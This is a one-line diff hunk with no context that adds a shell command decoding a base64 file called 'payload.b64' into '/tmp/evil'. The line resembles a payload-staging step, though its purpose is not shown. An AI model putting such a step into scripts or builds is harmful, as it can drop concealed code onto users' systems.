@@ -1,0 +1,1 @@
+base64 -d payload.b64 > /tmp/evil
